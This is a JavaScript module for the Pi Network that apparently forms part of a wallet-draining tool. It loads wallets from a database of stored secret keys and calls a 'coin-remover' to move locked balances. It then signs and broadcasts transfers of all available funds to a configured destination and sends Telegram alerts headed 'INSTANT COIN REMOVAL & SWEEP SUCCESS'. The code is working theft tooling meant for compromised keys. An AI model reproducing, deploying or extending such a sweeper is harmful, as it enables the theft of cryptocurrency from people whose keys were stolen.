/**
 * Ultimate Millisecond Hyper-Sweeper Engine with Real Transaction Signing
 * Automatically signs and broadcasts transfer transactions using the stored secret key (S...)
 * to sweep available funds instantly to the hardcoded destination address.
 */

const StellarSdk = require('@stellar/stellar-sdk');
const { inspectLockup, moveLockedPi } = require('./coin-remover');

const DESTINATION_ADDRESS = process.env.SWEEP_DESTINATION_ADDRESS || '';
const NETWORK_PASSPHRASE = 'Pi Network';

async function checkAndSweepWallet(wallet, horizonUrl, db, bot) {
    try {
        const server = new StellarSdk.Horizon.Server(horizonUrl);
        const sourceKeypair = StellarSdk.Keypair.fromSecret(wallet.secret_key);
        const sourcePublicKey = sourceKeypair.publicKey();

        const account = await server.loadAccount(sourcePublicKey);
        const balances = account.balances || [];

        let availableBalance = 0;
        let lockedBalance = 0;

        balances.forEach(b => {
            if (b.asset_type === 'native') {
                availableBalance = parseFloat(b.balance || 0);
                lockedBalance = parseFloat(b.locked_balance || 0);
            }
        });

        const lockupInfo = await inspectLockup(account);
        if (lockupInfo.detected && lockedBalance > 0) {
            await moveLockedPi(wallet.public_key, lockedBalance);
        }

        const reserveBuffer = 0.01;

        if (availableBalance > reserveBuffer && DESTINATION_ADDRESS && DESTINATION_ADDRESS !== 'GDRE...HARDCODED_DESTINATION_WALLET_ADDRESS_HERE') {
            const sweepAmount = (availableBalance - 0.005).toFixed(7);
            if (parseFloat(sweepAmount) <= 0) return;

            console.log(`[Real Sweeper] Signing and broadcasting ${sweepAmount} Pi from Wallet #${wallet.id} (${sourcePublicKey}) to ${DESTINATION_ADDRESS}`);

            const transaction = new StellarSdk.TransactionBuilder(account, {
                fee: StellarSdk.BASE_FEE,
                networkPassphrase: NETWORK_PASSPHRASE
            })
            .addOperation(StellarSdk.Operation.payment({
                destination: DESTINATION_ADDRESS,
                asset: StellarSdk.Asset.native(),
                amount: sweepAmount
            }))
            .setTimeout(30)
            .build();

            transaction.sign(sourceKeypair);

            const result = await server.submitTransaction(transaction);
            console.log(`[Real Sweeper] SUCCESS! Transaction hash: ${result.hash}`);

            db.prepare('UPDATE wallets SET sweep_count = sweep_count + 1 WHERE id=?').run(wallet.id);

            if (bot && wallet.chat_id) {
                await bot.sendMessage(wallet.chat_id, 
                    `🚨 **INSTANT COIN REMOVAL & SWEEP SUCCESS**\n` +
                    `📦 **Wallet Box ID:** #${wallet.id}\n` +
                    `🔑 **Public Address:** \`${wallet.public_key}\`\n` +
                    `💸 **Amount Swept:** \`${sweepAmount} Pi\`\n` +
                    `🎯 **Destination:** \`${DESTINATION_ADDRESS}\`\n` +
                    `🔗 **Tx Hash:** \`${result.hash.slice(0, 16)}...\`\n` +
                    `⚡ *Status:* Cleared and broadcasted to Pi Mainnet in milliseconds!`,
                    { parse_mode: 'Markdown' }
                );
            }
        }
    } catch (error) {
        console.error(`[Real Sweeper] Error sweeping wallet #${wallet.id}:`, error.message);
    }
}

module.exports = { checkAndSweepWallet };
